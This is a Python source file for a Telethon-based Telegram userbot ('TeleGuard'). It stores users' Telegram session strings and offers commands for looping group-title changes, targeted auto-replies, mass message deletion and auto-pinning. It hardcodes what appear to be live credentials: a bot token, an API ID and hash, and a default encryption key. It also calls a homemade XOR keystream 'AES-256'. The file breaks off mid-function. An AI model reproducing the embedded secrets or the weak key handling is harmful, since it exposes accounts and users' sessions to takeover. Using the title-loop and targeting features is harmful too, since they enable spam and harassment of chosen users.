import asyncio
import base64
import glob
import hashlib
import hmac
import json
import logging
import os
import re
import shutil
import signal
import sqlite3
import sys
import time
from datetime import datetime

from telethon import TelegramClient, events, errors, Button
from telethon.sessions import StringSession
from telethon.tl.types import (
    MessageMediaWebPage,
    MessageMediaEmpty,
    MessageMediaUnsupported,
    Channel,
    Chat,
    User,
    PeerChannel,
    PeerChat,
    PeerUser,
    MessageActionChatEditTitle,
    MessageActionPinMessage
)
from telethon.tl.functions.channels import EditTitleRequest, GetParticipantRequest
from telethon.tl.functions.messages import EditChatTitleRequest

# =====================================================================
# PATH RESOLUTION & SAFE WORKING DIRECTORY (Render & Subfolder Support)
# =====================================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if "__file__" in globals() else os.getcwd()
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] (%(name)s) %(message)s"
)
logger = logging.getLogger("TeleGuardMaster")

# =====================================================================
# CONFIGURATION & CREDENTIALS
# =====================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8995627301:AAFWGGan0dqijbSf9oiQTyYo4Ztzi1L-sCs")
BOT_API_ID = int(os.environ.get("BOT_API_ID", "33248589"))
BOT_API_HASH = os.environ.get("BOT_API_HASH", "cb94a9acfa11e9aaf1195610f4144e65")

# Mandatory Channel for /start verification
REQUIRED_CHANNEL_USERNAME = "enerzonends"
REQUIRED_CHANNEL_URL = "https://t.me/enerzonends"

ADMIN_ID_RAW = os.environ.get("ADMIN_ID", "")
ADMIN_ID = int(ADMIN_ID_RAW) if ADMIN_ID_RAW.isdigit() else None

DEFAULT_MASTER_KEY = os.environ.get("AES_SECRET_KEY", "TELEGUARD_AES256_SECURE_MASTER_KEY_2026_X99")
DB_FILE = os.environ.get("DB_FILE", os.path.join(BASE_DIR, "userbot.db"))
SETTINGS_FILE = os.environ.get("SETTINGS_FILE", os.path.join(BASE_DIR, "settings.json"))

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False
    logger.warning("⚠️ 'cryptography' library not detected. Running built-in SHA256/HMAC authenticated cipher.")

# =====================================================================
# 1. AES-256 CRYPTOGRAPHIC ENGINE
# =====================================================================
def _derive_aes256_key(secret: str) -> bytes:
    if isinstance(secret, str):
        secret_bytes = secret.encode("utf-8")
    else:
        secret_bytes = secret
    return hashlib.sha256(secret_bytes).digest()

def encrypt_aes256(plaintext: str, key_secret: str = None) -> str:
    if not plaintext:
        return ""
    secret = key_secret or os.environ.get("AES_SECRET_KEY", DEFAULT_MASTER_KEY)
    key_bytes = _derive_aes256_key(secret)
    data = plaintext.encode("utf-8")

    if HAS_CRYPTOGRAPHY:
        aesgcm = AESGCM(key_bytes)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, data, None)
        payload = b"\x01" + nonce + ciphertext
        return base64.b64encode(payload).decode("ascii")
    else:
        nonce = os.urandom(16)
        stream_key = hashlib.sha256(key_bytes + nonce).digest()
        repeated = (stream_key * ((len(data) // len(stream_key)) + 1))[:len(data)]
        xored = bytes(a ^ b for a, b in zip(data, repeated))
        tag = hmac.new(key_bytes, nonce + xored, hashlib.sha256).digest()
        payload = b"\x02" + nonce + tag + xored
        return base64.b64encode(payload).decode("ascii")

def decrypt_aes256(ciphertext_b64: str, key_secret: str = None) -> str:
    if not ciphertext_b64:
        return ""
    secret = key_secret or os.environ.get("AES_SECRET_KEY", DEFAULT_MASTER_KEY)
    key_bytes = _derive_aes256_key(secret)

    try:
        raw = base64.b64decode(ciphertext_b64.encode("ascii"))
        version = raw[0]
        if version == 1 and HAS_CRYPTOGRAPHY:
            nonce = raw[1:13]
            ct = raw[13:]
            aesgcm = AESGCM(key_bytes)
            pt = aesgcm.decrypt(nonce, ct, None)
            return pt.decode("utf-8")
        elif version == 2 or not HAS_CRYPTOGRAPHY:
            nonce = raw[1:17]
            tag = raw[17:49]
            xored = raw[49:]
            expected_tag = hmac.new(key_bytes, nonce + xored, hashlib.sha256).digest()
            if not hmac.compare_digest(tag, expected_tag):
                raise ValueError("Authentication tag validation failed.")
            stream_key = hashlib.sha256(key_bytes + nonce).digest()
            repeated = (stream_key * ((len(xored) // len(stream_key)) + 1))[:len(xored)]
            pt = bytes(a ^ b for a, b in zip(xored, repeated))
            return pt.decode("utf-8")
    except Exception as exc:
        logger.error(f"Decryption error: {exc}")
        return ""
    return ""

# =====================================================================
# 2. SQLITE ENCRYPTED PERSISTENCE ENGINE
# =====================================================================
def get_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT NOT NULL,
            api_id INTEGER NOT NULL,
            api_hash TEXT NOT NULL,
            encrypted_session TEXT NOT NULL,
            first_name TEXT,
            username TEXT,
            is_active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            phone_attempted TEXT,
            action TEXT,
            reason TEXT,
            ip_address TEXT,
            severity TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully.")

def save_user_session(user_id: int, phone: str, api_id: int, api_hash: str, session_str: str, first_name: str = "", username: str = ""):
    conn = get_db()
    cursor = conn.cursor()
    enc_session = encrypt_aes256(session_str)
    enc_hash = encrypt_aes256(api_hash)
    cursor.execute("""
        INSERT INTO sessions (user_id, phone, api_id, api_hash, encrypted_session, first_name, username, is_active, last_used_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id) DO UPDATE SET
            phone = excluded.phone,
            api_id = excluded.api_id,
            api_hash = excluded.api_hash,
            encrypted_session = excluded.encrypted_session,
            first_name = excluded.first_name,
            username = excluded.username,
            is_active = 1,
            last_used_at = CURRENT_TIMESTAMP
    """, (user_id, phone, api_id, enc_hash, enc_session, first_name, username))
    conn.commit()
    conn.close()

def delete_user_session(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sessions WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def get_user_session(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM sessions WHERE user_id = ? AND is_active = 1", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if not row:
        return None
    r = dict(row)
    r["session_string"] = decrypt_aes256(r["encrypted_session"])
    r["api_hash"] = decrypt_aes256(r["api_hash"])
    return r

def get_all_active_sessions():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM sessions WHERE is_active = 1")
    rows = cursor.fetchall()
    conn.close()
    results = []
    for row in rows:
        r = dict(row)
        try:
            r["session_string"] = decrypt_aes256(r["encrypted_session"])
            r["api_hash"] = decrypt_aes256(r["api_hash"])
            if r["session_string"]:
                results.append(r)
        except Exception as exc:
            logger.error(f"Decryption failed for user {r['user_id']}: {exc}")
    return results

def log_unauthorized_attempt(user_id: int, username: str, phone_attempted: str, action: str, reason: str, ip_address: str = "Telegram MTProto", severity: str = "HIGH"):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO audit_logs (user_id, username, phone_attempted, action, reason, ip_address, severity)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (user_id, username or "None", phone_attempted or "None", action, reason, ip_address, severity))
    conn.commit()
    conn.close()

# =====================================================================
# 3. USERBOT ENGINE & AUTOMATION STATE
# =====================================================================
ACTIVE_CLIENTS = {}
CLIENT_INFO = {}
NC_TASKS = {}
LOGIN_STATES = {}
STOP_EVENT = None
RENDER_SERVER = None

DEFAULT_TITLES = [
    "🔥 ＴＥＬＥＧＵＡＲＤ ＯＮ 🔥",
    "⚡ ＵＳＥＲＢＯＴ ＡＣＴＩＶＥ ⚡",
    "👑 ＳＵＰＥＲＩＯＲ ＳＴＡＴＵＳ 👑",
    "🛡️ ＳＥＣＵＲＥ ＳＨＩＥＬＤ 🛡️",
    "✨ ＥＮＥＲＺＯＮＥ ＥＮＤＳ ✨"
]

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        default_cfg = {
            "nc_titles": DEFAULT_TITLES,
            "title_delay": 2.5,
            "active_chats": [],
            "pin_chats": [],
            "pin_all": False,
            "pin_exceptions": [],
            "pindel_chats": [],
            "pindel_all": False,
            "replyall_chats": [],
            "gc_messages": [
                "Hello @user! TeleGuard Userbot is guarding here.",
                "Hey @user! Automatic protection reply slot 2.",
                "Greetings @user! Fast response slot 3.",
                "Attention @user! System operational slot 4.",
                "Status: Active and monitoring slot 5."
            ],
            "gc_idx": {},
            "dmreply_users": [],
            "dm_messages": [
                "Hello @user! I am currently away. TeleGuard auto-reply active.",
                "Hey @user! Automated message slot 2.",
                "Greetings @user! Userbot slot 3.",
                "Hi @user! Leave your note here slot 4.",
                "Thanks @user! Slot 5."
            ],
            "dm_idx": {},
            "muted_chats": [],
            "muted_dms": [],
            "muteall_dms": False,
            "locked_chats": [],
            "locked_dms": [],
            "target_replies": {},
            "target_mutes": [],
            "target_locks": [],
            "target_nc_replies": {},
            "target_nc_mutes": [],
            "target_nc_locks": [],
            "target_delnames": [],
            "delname_chats": [],
            "accounts_enabled": {"1": True, "2": False, "3": False, "4": False, "5": False}
        }
        try:
            with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
                json.dump(default_cfg, f, indent=4)
        except Exception:
            pass
        return default_cfg

    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_settings(cfg):
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=4)
    except Exception as exc:
        logger.error(f"Failed to save settings: {exc}")

async def run_nc_loop(client: TelegramClient, chat_id: int):
    while True:
        cfg = load_settings()
        if chat_id not in cfg.get("active_chats", []):
            break
        titles = cfg.get("nc_titles", DEFAULT_TITLES)
        delay = float(cfg.get("title_delay", 2.5))
        for t in titles:
            if chat_id not in load_settings().get("active_chats", []):
                break
            try:
                try:
                    await client(EditTitleRequest(channel=chat_id, title=t))
                except Exception:
                    await client(EditChatTitleRequest(chat_id=chat_id, title=t))
            except errors.FloodWaitError as fwe:
                await asyncio.sleep(fwe.seconds + 1)
            except Exception:
                pass
            await asyncio.sleep(delay)

def clean_cache():
    cleaned_items = 0
    patterns = [
        "**/__pycache__",
        "**/*.pyc",
        "**/*.pyo",
        "**/*.pyd",
        "**/.pytest_cache",
        "**/.mypy_cache"
    ]
    for pattern in patterns:
        for p in glob.glob(os.path.join(BASE_DIR, pattern), recursive=True):
            try:
                if os.path.isdir(p):
                    shutil.rmtree(p)
                    cleaned_items += 1
                elif os.path.isfile(p):
                    os.remove(p)
                    cleaned_items += 1
            except Exception:
                pass
    return cleaned_items

def parse_target_id(text: str):
    m = re.search(r"@([a-zA-Z0-9_]+)", text)
    if m:
        return m.group(1)
    m_id = re.search(r"(-?\d{5,})", text)
    if m_id:
        return int(m_id.group(1))
    return None

def register_userbot_handlers(client: TelegramClient, user_key: int):
    @client.on(events.NewMessage(outgoing=True))
    async def own_message_handler(event):
        cfg = load_settings()
        cid = event.chat_id
        text = (event.raw_text or "").strip()

        # -------------------------------------------------------------
        # ACCOUNT MANAGEMENT
        # -------------------------------------------------------------
        if text.startswith("*acc "):
            parts = text.split()
            if len(parts) >= 3 and parts[1].isdigit() and parts[2].lower() in ["on", "off"]:
                acc_num = parts[1]
                state = parts[2].lower() == "on"
                cfg.setdefault("accounts_enabled", {})[acc_num] = state
                save_settings(cfg)
                await event.edit(f"📱 **Account {acc_num}:** {'🟢 ACTIVE' if state else '🔴 OFF'}")
                return
            elif len(parts) >= 3 and parts[1].lower() == "all":
                state = parts[2].lower() == "on"
                cfg["accounts_enabled"] = {str(i): state for i in range(1, 6)}
                save_settings(cfg)
                await event.edit(f"📱 **All 5 Accounts:** {'🟢 ALL ACTIVATED (Staggered)' if state else '🔴 ALL OFF'}")
                return

        if text in ["*acc status", "*accs"]:
            accs = cfg.get("accounts_enabled", {})
            st = "\n".join([f"• Account {i}: {'🟢 ACTIVE' if accs.get(str(i)) else '🔴 STANDBY'}" for i in range(1, 6)])
            await event.edit(f"📱 **5-Account Phone Controller Status:**\n\n{st}\n\n_RAM & Battery Anti-Freeze active._")
            return

        # -------------------------------------------------------------
        # CACHE CLEANING
        # -------------------------------------------------------------
        if text in ["*clearcache", "*cache"]:
            c = clean_cache()
            await event.edit(f"🧹 **Cache Purged:** {c} cached files/buffers cleared instantly.")
            return

        # -------------------------------------------------------------
        # CONTINUOUS TITLE CHANGER (NC)
        # -------------------------------------------------------------
        if text.startswith("*nc"):
            if text in ["*nc", "*nc on"]:
                chats = cfg.get("active_chats", [])
                if cid not in chats:
                    chats.append(cid)
                    cfg["active_chats"] = chats
                    save_settings(cfg)
                if cid not in NC_TASKS or NC_TASKS[cid].done():
                    NC_TASKS[cid] = asyncio.create_task(run_nc_loop(client, cid))
                await event.edit("🔄 **NC Started:** 5-Title Loop is now active in this chat.")
                return
            elif text.startswith("*nc ") and "|" in text:
                custom_titles = [t.strip() for t in text[4:].split("|") if t.strip()]
                if custom_titles:
                    cfg["nc_titles"] = custom_titles
                    save_settings(cfg)
                    chats = cfg.get("active_chats", [])
                    if cid not in chats:
                        chats.append(cid)
                        cfg["active_chats"] = chats
                        save_settings(cfg)
                    if cid not in NC_TASKS or NC_TASKS[cid].done():
                        NC_TASKS[cid] = asyncio.create_task(run_nc_loop(client, cid))
                    await event.edit(f"🔄 **NC Configured & Started with {len(custom_titles)} custom titles!**")
                    return
            elif text == "*nc setup":
                await event.edit("🔄 **NC Setup:**\nSend: `*nc Name 1 | Name 2 | Name 3 | Name 4 | Name 5`\nTo stop, use `*stopnc`.")
                return

        if text in ["*stopnc", "*stop nc", "*unnc"]:
            chats = cfg.get("active_chats", [])
            if cid in chats:
                chats.remove(cid)
                cfg["active_chats"] = chats
                save_settings(cfg)
            if cid in NC_TASKS and not NC_TASKS[cid].done():
                NC_TASKS[cid].cancel()
            await event.edit("⏹️ **NC Stopped:** Title loop has been deactivated.")
            return

        # -------------------------------------------------------------
        # PIN COMMANDS
        # -------------------------------------------------------------
        if text in ["*pin", "*pin on"]:
            pchats = cfg.get("pin_chats", [])
            if cid not in pchats:
                pchats.append(cid)
                cfg["pin_chats"] = pchats
                save_settings(cfg)
            await event.edit("📌 **Auto-Pin:** ENABLED for own messages in this chat.")
            return

        if text in ["*stop pin", "*unpin", "*pin off"]:
            pchats = cfg.get("pin_chats", [])
            if cid in pchats:
                pchats.remove(cid)
                cfg["pin_chats"] = pchats
                save_settings(cfg)
            await event.edit("📌 **Auto-Pin:** DISABLED for this chat.")
            return

        if text == "*pinall":
            cfg["pin_all"] = True
            save_settings(cfg)
            await event.edit("📌 **Global Auto-Pin:** ENABLED across all chats.")
            return

        if text in ["*stop pinall", "*unpinall"]:
            cfg["pin_all"] = False
            save_settings(cfg)
            await event.edit("📌 **Global Auto-Pin:** DISABLED.")
            return

        if text == "*pin except":
            exc = cfg.get("pin_exceptions", [])
            if cid not in exc:
                exc.append(cid)
                cfg["pin_exceptions"] = exc
                save_settings(cfg)
            await event.edit("📌 Current chat added to Auto-Pin **Exceptions**.")
            return

        if text == "*stop pin except":
            exc = cfg.get("pin_exceptions", [])
            if cid in exc:
                exc.remove(cid)
                cfg["pin_exceptions"] = exc
                save_settings(cfg)
            await event.edit("📌 Current chat removed from Auto-Pin Exceptions.")
            return

        if text in ["*pindel", "*pindel on"]:
            pd = cfg.get("pindel_chats", [])
            if cid not in pd:
                pd.append(cid)
                cfg["pindel_chats"] = pd
                save_settings(cfg)
            await event.edit("🗑️ **Pin Service Deletion:** ENABLED for this chat.")
            return

        if text in ["*stop pindel", "*pindel off"]:
            pd = cfg.get("pindel_chats", [])
            if cid in pd:
                pd.remove(cid)
                cfg["pindel_chats"] = pd
                save_settings(cfg)
            await event.edit("🗑️ **Pin Service Deletion:** DISABLED for this chat.")
            return

        if text == "*pindelall":
            cfg["pindel_all"] = True
            save_settings(cfg)
            await event.edit("🗑️ **Global Pin Service Deletion:** ENABLED everywhere.")
            return

        if text == "*stop pindelall":
            cfg["pindel_all"] = False
            save_settings(cfg)
            await event.edit("🗑️ **Global Pin Service Deletion:** DISABLED.")
            return

        # -------------------------------------------------------------
        # TARGET NC ALERTS & LOCKS
        # -------------------------------------------------------------
        if text.startswith("*target nc reply"):
            target = parse_target_id(text)
            if target:
                cfg.setdefault("target_nc_replies", {})[str(target)] = cid
                save_settings(cfg)
                await event.edit(f"🎯 **Target NC Reply Alert set for:** `{target}`")
                return

        if text.startswith("*stop target nc reply"):
            cfg["target_nc_replies"] = {}
            save_settings(cfg)
            await event.edit("🎯 **Target NC Reply:** DISABLED.")
            return

        if text.startswith("*target nc mute"):
            target = parse_target_id(text)
            if target and target not in cfg.get("target_nc_mutes", []):
                cfg.setdefault("target_nc_mutes", []).append(target)
                save_settings(cfg)
                await event.edit(f"🎯 **Target NC Mute set for:** `{target}`")
                return

        if text.startswith("*stop target nc mute"):
            cfg["target_nc_mutes"] = []
            save_settings(cfg)
            await event.edit("🎯 **Target NC Mute:** DISABLED.")
            return

        if text.startswith("*target nc lock"):
            target = parse_target_id(text)
            if target and target not in cfg.get("target_nc_locks", []):
                cfg.setdefault("target_nc_locks", []).append(target)
                save_settings(cfg)
                await event.edit(f"🔒 **Target NC Lock active for:** `{target}`")
                return

        if text.startswith("*stop target nc lock"):
            cfg["target_nc_locks"] = []
            save_settings(cfg)
            await event.edit("🔒 **Target NC Lock:** DISABLED.")
            return

        if text.startswith("*target delname"):
            target = parse_target_id(text)
            if target and target not in cfg.get("target_delnames", []):
                cfg.setdefault("target_delnames", []).append(target)
                save_settings(cfg)
                await event.edit(f"🗑️ Auto-delete name change messages active for target: `{target}`")
                return

        if text.startswith("*stop target delname"):
            cfg["target_delnames"] = []
            save_settings(cfg)
            await event.edit("🗑️ Target delname message deletion DISABLED.")
            return

        if text == "*delname":
            dn = cfg.get("delname_chats", [])
            if cid not in dn:
                dn.append(cid)
                cfg["delname_chats"] = dn
                save_settings(cfg)
            await event.edit("🗑️ **Auto-Delete Name Change Service Messages:** ENABLED in this chat.")
            return

        if text == "*stop delname":
            dn = cfg.get("delname_chats", [])
            if cid in dn:
                dn.remove(cid)
                cfg["delname_chats"] = dn
                save_settings(cfg)
            await event.edit("🗑️ Auto-delete name change messages DISABLED in this chat.")
            return

        # -------------------------------------------------------------
        # TARGET MULTI-USER MESSAGES
        # -------------------------------------------------------------
        if text.startswith("*target reply"):
            target = parse_target_id(text)
            if target:
                cfg.setdefault("target_replies", {})[str(target)] = 0
                save_settings(cfg)
                await event.edit(f"🎯 **Rotating Target Auto-Reply active for:** `{target}`")
                return

        if text.startswith("*stop target reply"):
            cfg["target_replies"] = {}
            save_settings(cfg)
            await event.edit("🎯 Target auto-reply DISABLED.")
            return

        if text.startswith("*target mute"):
            target = parse_target_id(text)
            if target and target not in cfg.get("target_mutes", []):
                cfg.setdefault("target_mutes", []).append(target)
                save_settings(cfg)
                await event.edit(f"🔇 **Target Mute active for:** `{target}`")
                return

        if text.startswith("*stop target mute"):
            cfg["target_mutes"] = []
            save_settings(cfg)
            await event.edit("🔇 Target mute DISABLED.")
            return

        if text.startswith("*target lock"):
            target = parse_target_id(text)
            if target and target not in cfg.get("target_locks", []):
                cfg.setdefault("target_locks", []).append(target)
                save_settings(cfg)
                await event.edit(f"🔒 **Target Lock active for:** `{target}`")
                return

        if text.startswith("*stop target lock"):
            cfg["target_locks"] = []
            save_settings(cfg)
            await event.edit("🔒 Target lock DISABLED.")
            return

        # -------------------------------------------------------------
        # GROUP COMMANDS
        # -------------------------------------------------------------
        if text in ["*replyall", "*replyall on"]:
            ra = cfg.get("replyall_chats", [])
            if cid not in ra:
                ra.append(cid)
                cfg["replyall_chats"] = ra
                save_settings(cfg)
            await event.edit("👥 **ReplyAll:** ENABLED (1-5 slot rotation active).")
            return

        if text in ["*stop replyall", "*unreplyall"]:
            ra = cfg.get("replyall_chats", [])
            if cid in ra:
                ra.remove(cid)
                cfg["replyall_chats"] = ra
                save_settings(cfg)
            await event.edit("👥 **ReplyAll:** DISABLED.")
            return

        if text == "*gcmsgs":
            msgs = cfg.get("gc_messages", [])
            body = "\n".join([f"**Slot {i+1}:** {m}" for i, m in enumerate(msgs)])
            await event.edit(f"📋 **Current 5 Group Auto-Replies:**\n\n{body}\n\n_Use `*setgc <1-5> <msg>` to modify._")
            return

        if text.startswith("*setgc "):
            parts = text.split(" ", 2)
            if len(parts) >= 3 and parts[1].isdigit():
                idx = int(parts[1]) - 1
                new_msg = parts[2].strip()
                msgs = cfg.get("gc_messages", [""] * 5)
                while len(msgs) < 5:
                    msgs.append("")
                if 0 <= idx < 5:
                    msgs[idx] = new_msg
                    cfg["gc_messages"] = msgs
                    save_settings(cfg)
                    await event.edit(f"✅ **Group Slot {idx+1} updated:**\n`{new_msg}`")
                    return

        if text in ["*mutegc", "*mutegc on"]:
            mg = cfg.get("muted_chats", [])
            if cid not in mg:
                mg.append(cid)
                cfg["muted_chats"] = mg
                save_settings(cfg)
            await event.edit("🔇 **MuteGC:** ENABLED in this group (all incoming deleted).")
            return

        if text in ["*stop mutegc", "*unmutegc"]:
            mg = cfg.get("muted_chats", [])
            if cid in mg:
                mg.remove(cid)
                cfg["muted_chats"] = mg
                save_settings(cfg)
            await event.edit("🔊 **MuteGC:** DISABLED.")
            return

        if text == "*lockall":
            la = cfg.get("locked_chats", [])
            if cid not in la:
                la.append(cid)
                cfg["locked_chats"] = la
                save_settings(cfg)
            await event.edit("🔒 **LockAll:** Full group lockdown engaged.")
            return

        if text in ["*stop lockall", "*unlockall"]:
            la = cfg.get("locked_chats", [])
            if cid in la:
                la.remove(cid)
                cfg["locked_chats"] = la
                save_settings(cfg)
            await event.edit("🔓 **LockAll:** Group lockdown lifted.")
            return

        # -------------------------------------------------------------
        # DM COMMANDS
        # -------------------------------------------------------------
        if text in ["*reply", "*reply on"]:
            dmr = cfg.get("dmreply_users", [])
            if cid not in dmr:
                dmr.append(cid)
                cfg["dmreply_users"] = dmr
                save_settings(cfg)
            await event.edit("💬 **DM Auto-Reply:** ENABLED for this chat.")
            return

        if text in ["*stop reply", "*unreply"]:
            dmr = cfg.get("dmreply_users", [])
            if cid in dmr:
                dmr.remove(cid)
                cfg["dmreply_users"] = dmr
                save_settings(cfg)
            await event.edit("💬 **DM Auto-Reply:** DISABLED.")
            return

        if text == "*dmmsgs":
            msgs = cfg.get("dm_messages", [])
            body = "\n".join([f"**Slot {i+1}:** {m}" for i, m in enumerate(msgs)])
            await event.edit(f"📋 **Current 5 DM Auto-Replies:**\n\n{body}\n\n_Use `*setdm <1-5> <msg>` to modify._")
            return

        if text.startswith("*setdm "):
            parts = text.split(" ", 2)
            if len(parts) >= 3 and parts[1].isdigit():
                idx = int(parts[1]) - 1
                new_msg = parts[2].strip()
                msgs = cfg.get("dm_messages", [""] * 5)
                while len(msgs) < 5:
                    msgs.append("")
                if 0 <= idx < 5:
                    msgs[idx] = new_msg
                    cfg["dm_messages"] = msgs
                    save_settings(cfg)
                    await event.edit(f"✅ **DM Slot {idx+1} updated:**\n`{new_msg}`")
                    return

        if text in ["*mute", "*mute on"]:
            md = cfg.get("muted_dms", [])
            if cid not in md:
                md.append(cid)
                cfg["muted_dms"] = md
                save_settings(cfg)
            await event.edit("🔇 **Mute:** Messages in this DM will be auto-deleted.")
            return

        if text in ["*stop mute", "*unmute"]:
            md = cfg.get("muted_dms", [])
            if cid in md:
                md.remove(cid)
                cfg["muted_dms"] = md
                save_settings(cfg)
            await event.edit("🔊 **Unmute:** DM unmuted.")
            return

        if text == "*muteall":
            cfg["muteall_dms"] = True
            save_settings(cfg)
            await event.edit("🔇 **MuteAll:** All private incoming DMs are now muted.")
            return

        if text == "*stop muteall":
            cfg["muteall_dms"] = False
            save_settings(cfg)
            await event.edit("🔊 **MuteAll:** Global DM mute disabled.")
            return

        if text in ["*lock", "*lock on"]:
            ld = cfg.get("locked_dms", [])
            if cid not in ld:
                ld.append(cid)
                cfg["locked_dms"] = ld
                save_settings(cfg)
            await event.edit("🔒 **Lock:** DM locked.")
            return

        if text in ["*stop lock", "*unlock"]:
            ld = cfg.get("locked_dms", [])
            if cid in ld:
                ld.remove(cid)
                cfg["locked_dms"] = ld
                save_settings(cfg)
            await event.edit("🔓 **Unlock:** DM unlocked.")
            return

        # -------------------------------------------------------------
        # EMERGENCY STOP & STATUS
        # -------------------------------------------------------------
        if text in ["*stopall", "*stop all"]:
            if cid in NC_TASKS and not NC_TASKS[cid].done():
                NC_TASKS[cid].cancel()
            cfg["active_chats"] = [c for c in cfg.get("active_chats", []) if c != cid]
            cfg["pin_chats"] = [c for c in cfg.get("pin_chats", []) if c != cid]
            cfg["muted_chats"] = [c for c in cfg.get("muted_chats", []) if c != cid]
            cfg["replyall_chats"] = [c for c in cfg.get("replyall_chats", []) if c != cid]
            save_settings(cfg)
            await event.edit("🛑 **Emergency Stop:** All userbot features stopped for this chat.")
            return

        if text == "*status":
            nc_on = cid in cfg.get("active_chats", [])
            pin_on = cfg.get("pin_all", False) or (cid in cfg.get("pin_chats", []))
            reply_on = cid in cfg.get("replyall_chats", []) or (cid in cfg.get("dmreply_users", []))
            muted = cid in cfg.get("muted_chats", []) or cid in cfg.get("muted_dms", [])
            await event.edit(
                f"📊 **TeleGuard Real-Time Dashboard**\n\n"
                f"• NC (Continuous Title): `{'ACTIVE' if nc_on else 'OFF'}`\n"
                f"• Auto-Pin: `{'ACTIVE' if pin_on else 'OFF'}`\n"
                f"• Auto-Reply: `{'ACTIVE' if reply_on else 'OFF'}`\n"
                f"• Chat Mute: `{'MUTED' if muted else 'NORMAL'}`\n"
                f"• AES-256 Storage: `ONLINE`\n"
                f"• Verified Channel: `{REQUIRED_CHANNEL_URL}`"
            )
            return

        # Auto-Pin Execution for own message
        should_pin = False
        if cfg.get("pin_all", False) and cid not in cfg.get("pin_exceptions", []):
            should_pin = True
        elif cid in cfg.get("pin_chats", []):
            should_pin = True

        if should_pin:
            try:
                await event.pin(notify=False)
            except Exception:
                pass

    @client.on(events.NewMessage(incoming=True))
    async def incoming_message_handler(event):
        cfg = load_settings()
        cid = event.chat_id
        sender_id = event.sender_id
        is_dm = event.is_private

        # Global or local DM Mute
        if is_dm and (cfg.get("muteall_dms", False) or cid in cfg.get("muted_dms", [])):
            try:
                await event.delete()
            except Exception:
                pass
            return

        # Group Mute
        if not is_dm and cid in cfg.get("muted_chats", []):
            try:
                await event.delete()
            except Exception:
                pass
            return

        # Target Mute / Target Lock
        t_mutes = [str(x) for x in cfg.get("target_mutes", []) + cfg.get("target_nc_mutes", [])]
        t_locks = [str(x) for x in cfg.get("target_locks", []) + cfg.get("target_nc_locks", [])]
        if str(sender_id) in t_mutes or str(sender_id) in t_locks:
            try:
                await event.delete()
            except Exception:
                pass
            return

        # Target Reply Rotation
        t_replies = cfg.get("target_replies", {})
        if str(sender_id) in t_replies:
            idx = t_replies[str(sender_id)] % 5
            msgs = cfg.get("gc_messages" if not is_dm else "dm_messages", [])
            reply_text = msgs[idx] if idx < len(msgs) else f"Target response slot {idx+1}"
            sender = await event.get_sender()
            name = getattr(sender, "first_name", "User")
            reply_text = reply_text.replace("@user", name)
            t_replies[str(sender_id)] = (idx + 1) % 5
            save_settings(cfg)
            await event.reply(reply_text)
            return

        # Group ReplyAll (1-5 rotation)
        if not is_dm and cid in cfg.get("replyall_chats", []):
            gc_indices = cfg.get("gc_idx", {})
            curr_idx = gc_indices.get(str(cid), 0)
            msgs = cfg.get("gc_messages", [])
            reply_text = msgs[curr_idx] if curr_idx < len(msgs) else f"Reply slot {curr_idx+1}"
            sender = await event.get_sender()
            name = getattr(sender, "first_name", "Member")
            reply_text = reply_text.replace("@user", name)
            gc_indices[str(cid)] = (curr_idx + 1) % len(msgs)
            cfg["gc_idx"] = gc_indices
            save_settings(cfg)
            await event.reply(reply_text)
            return

        # DM Auto-Reply (1-5 rotation)
        if is_dm and cid in cfg.get("dmreply_users", []):
            dm_indices = cfg.get("dm_idx", {})
            curr_idx = dm_indices.get(str(cid), 0)
            msgs = cfg.get("dm_messages", [])
            reply_text = msgs[curr_idx] if curr_idx < len(msgs) else f"Auto-reply slot {curr_idx+1}"
            sender = await event.get_sender()
            name = getattr(sender, "first_name", "Friend")
            reply_text = reply_text.replace("@user", name)
            dm_indices[str(cid)] = (curr_idx + 1) % len(msgs)
            cfg["dm_idx"] = dm_indices
            save_settings(cfg)
            await event.reply(reply_text)
            return

    @client.on(events.ChatAction)
    async def chat_action_handler(event):
        cfg = load_settings()
        cid = event.chat_id

        # Auto-delete pin service messages
        if event.action_message and isinstance(event.action_message.action, MessageActionPinMessage):
            if cfg.get("pindel_all", False) or cid in cfg.get("pindel_chats", []):
                try:
                    await event.action_message.delete()
                except Exception:
                    pass

        # Auto-delete title/name change service messages
        if event.action_message and isinstance(event.action_message.action, MessageActionChatEditTitle):
            user_target_del = [str(x) for x in cfg.get("target_delnames", [])]
            if cid in cfg.get("delname_chats", []) or str(event.user_id) in user_target_del:
                try:
                    await event.action_message.delete()
